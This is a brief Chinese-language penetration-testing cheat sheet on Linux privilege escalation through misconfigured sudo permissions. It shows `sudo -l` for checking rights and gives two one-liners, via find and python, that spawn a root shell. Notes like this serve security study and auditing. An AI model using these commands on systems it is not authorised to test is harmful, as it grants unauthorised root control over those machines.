# sudo

- 能访问sudo的用户，可执行所有root权限的命令
- 利用错误配置的sudo权限提权
- 查看当前权限
  - `sudo -l`
- 可利用的方式
  - find: `sudo find /home -exec sh -i \; -quit`
  - python: `sudo python -c "import pty;pty.spawn('/bin/bash')"`